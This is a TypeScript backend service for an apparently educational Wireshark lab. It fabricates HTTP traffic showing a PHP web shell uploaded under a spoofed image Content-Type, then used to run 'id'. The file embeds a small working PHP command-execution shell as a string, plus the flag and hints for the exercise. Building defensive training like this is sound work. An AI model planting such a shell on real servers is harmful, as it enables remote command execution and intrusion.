// src/modules/practice-labs/wireshark/labs/lab8/lab8.service.ts
// LAB 8 — Web Shell Upload via HTTP POST (Advanced)
// Scenario : IDS alert on compromised web server — attacker uploaded PHP shell
// الطالب يحدد الـ POST request، يعمل inspect لـ multipart payload،
//           يعمل hex decode للـ flag المخبي جوه الـ shell
// Flag     : مخبي في hex داخل الـ PHP shell content
import { Injectable, BadRequestException } from '@nestjs/common';
import { PrismaService } from '../../../../../core/database';
import { PracticeLabStateService } from '../../../shared/services/practice-lab-state.service';
import { FlagRecordService } from '../../../shared/services/flag-record.service';

const FLAG_PREFIX  = 'FLAG{WIRESHARK-LAB8-WEBSHELL';
const ATTACKER_IP  = '192.168.1.88';
const SERVER_IP    = '10.10.0.5';
const SHELL_FILE   = 'images/thumb_update.php';

function toHex(str: string): string {
  return Buffer.from(str).toString('hex');
}

@Injectable()
export class Lab8Service {
  constructor(
    private prisma: PrismaService,
    private stateService: PracticeLabStateService,
    private flagRecord: FlagRecordService,
  ) {}

  async initLab(userId: string, labId: string) {
    const result = await this.stateService.initializeState(userId, labId);
    await this.flagRecord.generateAndStore(
      userId,
      result.labId,
      'lab8-webshell-attempt',
      result.dynamicFlag,
      24,
    );
    return { status: 'success', message: 'Web Shell Upload lab initialized', labId: result.labId };
  }

  async getCapture(userId: string, labId: string) {
    const resolvedLabId = await this.stateService.resolveLabId(labId);
    const dynamicFlag   = this.stateService.generateDynamicFlag(FLAG_PREFIX, userId, resolvedLabId);
    const hexFlag       = toHex(dynamicFlag);

    const shellContent = `<?php\nif(isset($_REQUEST['cmd'])){\n  $c=$_REQUEST['cmd'];\n  echo shell_exec($c);\n}\n// HIDDEN: ${hexFlag}\n?>`;

    const packets = [
      // Normal GET traffic
      { no: 1,  time: '0.000000', srcIp: '10.10.0.20', dstIp: SERVER_IP, source: '10.10.0.20', destination: SERVER_IP, protocol: 'HTTP', length: 290,
        info: 'GET /index.php HTTP/1.1',
        httpData: { method: 'GET', uri: '/index.php', statusCode: null, webshell: false } },
      { no: 2,  time: '0.010000', srcIp: SERVER_IP, dstIp: '10.10.0.20', source: SERVER_IP, destination: '10.10.0.20', protocol: 'HTTP', length: 540,
        info: 'HTTP/1.1 200 OK',
        httpData: { method: null, statusCode: 200, webshell: false } },
      // Normal file upload (legitimate)
      { no: 3,  time: '0.500000', srcIp: '10.10.0.31', dstIp: SERVER_IP, source: '10.10.0.31', destination: SERVER_IP, protocol: 'HTTP', length: 8240,
        info: 'POST /upload.php HTTP/1.1 (multipart/form-data)',
        httpData: {
          method:      'POST',
          uri:         '/upload.php',
          statusCode:  null,
          webshell:    false,
          filename:    'profile_photo.jpg',
          contentType: 'image/jpeg',
          note:        'Legitimate image upload — JPEG content type, no PHP code',
        },
      },
      { no: 4,  time: '0.501000', srcIp: SERVER_IP, dstIp: '10.10.0.31', source: SERVER_IP, destination: '10.10.0.31', protocol: 'HTTP', length: 180,
        info: 'HTTP/1.1 200 OK — Upload successful',
        httpData: { method: null, statusCode: 200, webshell: false } },
      // TCP filler
      { no: 5,  time: '1.000000', srcIp: '10.10.0.20', dstIp: SERVER_IP, source: '10.10.0.20', destination: SERVER_IP, protocol: 'TCP', length: 60,
        info: '55401 → 80 [SYN]', flags: 'SYN' },
      { no: 6,  time: '1.001000', srcIp: SERVER_IP, dstIp: '10.10.0.20', source: SERVER_IP, destination: '10.10.0.20', protocol: 'TCP', length: 60,
        info: '80 → 55401 [SYN, ACK]', flags: 'SYN,ACK' },
      // Normal HTTP GET
      { no: 7,  time: '2.000000', srcIp: '10.10.0.15', dstIp: SERVER_IP, source: '10.10.0.15', destination: SERVER_IP, protocol: 'HTTP', length: 295,
        info: 'GET /products.php HTTP/1.1',
        httpData: { method: 'GET', uri: '/products.php', statusCode: null, webshell: false } },
      { no: 8,  time: '2.010000', srcIp: SERVER_IP, dstIp: '10.10.0.15', source: SERVER_IP, destination: '10.10.0.15', protocol: 'HTTP', length: 1024,
        info: 'HTTP/1.1 200 OK',
        httpData: { method: null, statusCode: 200, webshell: false } },
      // ⚠️  MALICIOUS: PHP Web Shell Upload
      { no: 9,  time: '3.200000', srcIp: ATTACKER_IP, dstIp: SERVER_IP, source: ATTACKER_IP, destination: SERVER_IP, protocol: 'HTTP', length: 642,
        info: 'POST /upload.php HTTP/1.1 (multipart/form-data) — SUSPICIOUS',
        httpData: {
          method:      'POST',
          uri:         '/upload.php',
          statusCode:  null,
          webshell:    true,
          filename:    SHELL_FILE,
          contentType: 'image/jpeg',
          note:        `⚠️ Content-Type spoofed as image/jpeg but filename is .php! PHP web shell detected.`,
          userAgent:   'Mozilla/5.0 (compatible; attacker)',
          body:        shellContent,
          hexHint:     `Find the HIDDEN comment in the PHP code. The value is hex-encoded: ${hexFlag}`,
          flag:        dynamicFlag,
        },
      },
      { no: 10, time: '3.201000', srcIp: SERVER_IP, dstIp: ATTACKER_IP, source: SERVER_IP, destination: ATTACKER_IP, protocol: 'HTTP', length: 180,
        info: 'HTTP/1.1 200 OK — Upload successful (server did NOT validate extension!)',
        httpData: { method: null, statusCode: 200, webshell: false,
          note: 'Server accepted the .php file — no extension whitelist! Shell is now live at /uploads/' + SHELL_FILE } },
      // Attacker executes shell
      { no: 11, time: '4.000000', srcIp: ATTACKER_IP, dstIp: SERVER_IP, source: ATTACKER_IP, destination: SERVER_IP, protocol: 'HTTP', length: 312,
        info: `GET /uploads/${SHELL_FILE}?cmd=id HTTP/1.1`,
        httpData: { method: 'GET', uri: `/uploads/${SHELL_FILE}?cmd=id`, statusCode: null, webshell: false,
          note: 'Attacker verifying RCE — executing id command via uploaded shell' } },
      { no: 12, time: '4.001000', srcIp: SERVER_IP, dstIp: ATTACKER_IP, source: SERVER_IP, destination: ATTACKER_IP, protocol: 'HTTP', length: 280,
        info: 'HTTP/1.1 200 OK — RCE output: uid=33(www-data)',
        httpData: { method: null, statusCode: 200, webshell: false,
          note: 'Server executed shell command — RCE confirmed! uid=33(www-data)' } },
    ];

    return {
      packets,
      attackerIp: ATTACKER_IP,
      shellFile:  SHELL_FILE,
    };
  }

  async getProgress(userId: string, labId: string) {
    try {
      const resolvedLabId = await this.stateService.resolveLabId(labId);
      const progress = await this.prisma.userLabProgress.findFirst({
        where:  { userId, labId: resolvedLabId },
        select: { flagSubmitted: true, hintsUsed: true, startedAt: true, completedAt: true },
      });
      return {
        step:          progress?.flagSubmitted ? 'COMPLETED' : 'RUNNING',
        flagSubmitted: progress?.flagSubmitted ?? false,
        hintsUsed:     progress?.hintsUsed     ?? 0,
        startedAt:     progress?.startedAt     ?? null,
        completedAt:   progress?.completedAt   ?? null,
      };
    } catch {
      return { step: 'RUNNING', flagSubmitted: false, hintsUsed: 0 };
    }
  }

  async submitFlag(userId: string, labId: string, submittedFlag: string) {
    if (!submittedFlag?.trim()) throw new BadRequestException('flag is required');

    const resolvedLabId = await this.stateService.resolveLabId(labId);
    const result = await this.flagRecord.verifyAndConsume(
      userId,
      resolvedLabId,
      'lab8-webshell-attempt',
      submittedFlag.trim(),
    );

    if (result === 'correct') {
      return {
        success:     true,
        flag:        submittedFlag.trim(),
        message:     'Brilliant! You traced the full web shell upload attack chain.',
        explanation: 'Web shell attacks exploit unrestricted file upload vulnerabilities. ' +
          'Attackers spoof Content-Type headers to bypass basic checks and upload .php files. ' +
          'Defenders detect uploads via: extension whitelist, Content-Type validation, ' +
          'magic byte inspection, and WAF rules blocking PHP in upload directories. ' +
          'Monitoring: IDS signatures on multipart POST with script extensions.',
      };
    }
    if (result === 'already_used') return { success: false, message: 'Flag already submitted. Lab is solved!' };
    if (result === 'expired')      return { success: false, message: 'Session expired. Please restart the lab.' };

    return {
      success: false,
      message: `Incorrect. Find the POST request in packet #9 from ${ATTACKER_IP}. Expand the body, find the HIDDEN hex value, decode it with the Hex Decoder.`,
    };
  }
}
